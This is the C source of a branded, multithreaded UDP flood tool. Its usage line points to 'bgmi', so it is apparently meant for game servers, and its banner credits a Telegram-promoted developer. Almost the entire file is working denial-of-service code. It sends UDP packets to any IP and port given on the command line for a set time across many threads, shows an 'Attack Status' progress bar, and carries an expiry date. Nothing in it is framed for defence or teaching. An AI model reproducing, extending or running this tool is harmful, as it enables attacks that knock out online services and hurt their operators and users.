#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define EXPIRY_DATE "2026-3-3"

// Struct to hold the total_time argument for the status thread
struct status_thread_arg {
    int total_time;
};

// Function to compare current date with expiry date
int is_expired() {
    time_t t = time(NULL);
    struct tm *tm_info = localtime(&t);

    char current_date[11];
    strftime(current_date, sizeof(current_date), "%Y-%m-%d", tm_info);

    if (strcmp(current_date, EXPIRY_DATE) > 0) {
        return 1; // Expired
    }
    return 0; // Not expired
}

// Function to print the banner
void print_banner() {
    printf("\033[1;33m╔════════════════════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;33m║ \033[1;37m★ \033[1;32m⎯‌꯭𓆰꯭𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™⎯꯭‌⎯꯭ \033[1;37m★ \033[1;33m║\033[0m\n");
    printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;33m║ \033[1;36m✦ DEVELOPED BY: \033[1;32m@TF_FLASH92 \033[1;33m║\033[0m\n");
    printf("\033[1;33m║ \033[1;31m✦ [ https://t.me/FLASHxDILDOS ] \033[1;33m║\033[0m\n");
    printf("\033[1;33m║ \033[1;36m✦ CONTACT: \033[1;32m@TF_FLASH92 \033[1;33m║\033[0m\n");
    printf("\033[1;33m╠════════════════════════════════════════════════════════════════════════════════════════════════╣\033[0m\n");
    printf("\033[1;33m║ \033[1;37m★ \033[1;32m🍆🍆🍆🍆🍆🍆🍆🍆🍆 \033[1;37m★ \033[1;33m║\033[0m\n");

    // Extra decorations and stylish finishing touch
    printf("\033[1;33m╚════════════════════════════════════════════════════════════════════════════════════════════════╝\033[0m\n");

    // Adding even more special design elements (Stars, Borders, etc.)
    printf("\n\033[1;33m╔═══════════════════════════════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;33m║ \033[1;35m✨✨✨ \033[1;37mENJOY THE POWER OF \033[1;32m⎯‌꯭𓆰꯭𝙏𝙁_𝙁𝙇𝘼𝙎𝙃 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™\033[1;35m✨✨✨ \033[1;33m║\033[0m\n");
    printf("\033[1;33m╚═══════════════════════════════════════════════════════════════════════════════════════╝\033[0m\n");
}

void usage() {
    printf("Usage: ./bgmi ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

// Shared variables for progress tracking
volatile int processed_count = 0;  // Tracks processed packets
volatile int attack_time = 0;      // Time elapsed
pthread_mutex_t progress_lock;     // Lock to ensure thread-safe progress updates

// Function to display time left and progress bar
void print_status(void *arg) {
    struct status_thread_arg *status_arg = (struct status_thread_arg *)arg;
    int total_time = status_arg->total_time;

    // Start countdown and progress bar
    while (attack_time < total_time) {
        int time_left = total_time - attack_time;
        int progress = (processed_count * 100) / total_time;

        // Print status on the same line
        printf("\rTime Left: %02d:%02d | ", time_left / 60, time_left % 60);
        printf("\033[31m"); // Red color for the progress bar
        printf("Attack Status: [");
        for (int i = 0; i < 20; i++) {
            if (i < progress / 5) {
                printf("▓");
            } else {
                printf(" ");
            }
        }
        printf("] %d%%", progress);
        printf("\033[0m");

        fflush(stdout);
        usleep(100000); // Update every 100ms
        attack_time++;  // Increment the time elapsed
    }
}

// Attack thread function
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = { "Flood attack" };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
        // Lock before updating shared progress
        pthread_mutex_lock(&progress_lock);
        processed_count++;
        pthread_mutex_unlock(&progress_lock);

        usleep(10000); // To reduce CPU usage
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    print_banner();

    if (is_expired()) {
        printf("This program has expired. Expiry date: %s\n", EXPIRY_DATE);
        exit(0);
    }

    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    pthread_t status_thread;

    // Initialize mutex for progress tracking
    pthread_mutex_init(&progress_lock, NULL);

    printf("Flood started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    // Create a struct to pass time to status thread
    struct status_thread_arg *status_arg = malloc(sizeof(struct status_thread_arg));
    status_arg->total_time = time;

    // Create the status thread that will update progress and time
    pthread_create(&status_thread, NULL, (void *)print_status, (void *)status_arg);

    for (int i = 0; i < threads; i++) {
        struct thread_data *data = malloc(sizeof(struct thread_data));
        data->ip = ip;
        data->port = port;
        data->time = time;

        if (pthread_create(&thread_ids[i], NULL, attack, (void *)data) != 0) {
            perror("Thread creation failed");
            free(data);
            free(thread_ids);
            exit(1);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Wait for the status thread to finish
    pthread_join(status_thread, NULL);

    // Cleanup
    pthread_mutex_destroy(&progress_lock);
    free(thread_ids);
    free(status_arg);  // Free the allocated memory for status_arg

    printf("\nAttack Finished By @TF_FLASH92\n");
    return 0;
}
